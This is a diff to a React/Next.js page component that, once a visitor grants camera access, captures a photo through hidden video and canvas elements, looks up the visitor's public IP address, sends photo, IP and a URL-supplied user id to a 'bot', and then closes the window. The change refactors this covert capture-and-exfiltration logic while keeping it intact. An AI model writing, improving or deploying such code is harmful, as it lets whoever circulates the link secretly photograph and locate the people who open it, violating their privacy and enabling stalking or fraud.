@@ -6,51 +6,36 @@ import { useCamera } from "~/shared/use-camera";
 import { sendDataToBot } from "./actions";
 
 const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
+
 const Camera = ({ userId }: { userId: string }) => {
-	const { videoRef, canvasRef, takePhoto } = useCamera();
+	const { videoRef, canvasRef, photo } = useCamera();
 
-	const handlePhoto = useCallback(async () => {
-		const photo = takePhoto();
-		if (!photo || photo.endsWith("==")) {
-			return false;
-		}
+	const handlePhoto = useCallback(
+		async (photo: string) => {
+			const ip = await fetch("https://api.ipify.org/?format=json")
+				.then((res) => res.json())
+				.then((data) => data.ip)
+				.catch(() => "unknown");
 
-		let ip = "unknown";
-		try {
-			const res = await fetch("https://api.ipify.org/?format=json").then((res) => res.json());
-			if (res && "ip" in res && typeof res.ip === "string") {
-				ip = res.ip;
-			}
-		} catch (err) {
-			console.error(err);
-		}
-
-		try {
-			await sendDataToBot({ photo, userId, ip });
-			return true;
-		} catch (err) {
-			console.error(err);
-			return false;
-		}
-	}, [takePhoto, userId]);
-
-	useEffect(() => {
-		const interval = setInterval(async () => {
 			try {
-				const res = await handlePhoto();
-				if (!res) return;
+				await sendDataToBot({ photo, userId, ip });
 				window.close();
 			} catch (err) {
-				console.error(err);
+				console.error("Failed to send photo:", err);
 			}
-		}, 1000);
+		},
+		[userId],
+	);
 
-		return () => clearInterval(interval);
-	}, [handlePhoto]);
+	useEffect(() => {
+		if (photo) {
+			handlePhoto(photo);
+		}
+	}, [photo, handlePhoto]);
 
 	return (
 		<>
-			<video autoPlay ref={videoRef} style={{ display: "none" }} />
+			<video ref={videoRef} style={{ display: "none" }} autoPlay />
 			<canvas ref={canvasRef} style={{ display: "none" }} />
 		</>
 	);
@@ -67,18 +52,18 @@ function Page({ params }: Props) {
 
 	if (!params.slug?.length) {
 		window.close();
-		return;
-	}
-
-	if (status === null) {
 		return null;
 	}
 
-	return (
-		<div className="container">
-			{status === "granted" ? <Camera userId={params.slug[0]} /> : <CameraNotAllowed />}
-		</div>
-	);
+	if (status === "denied") {
+		return <CameraNotAllowed />;
+	}
+
+	if (status === "granted") {
+		return <Camera userId={params.slug[0]} />;
+	}
+
+	return null;
 }
 
 export default dynamic(() => Promise.resolve(Page), {
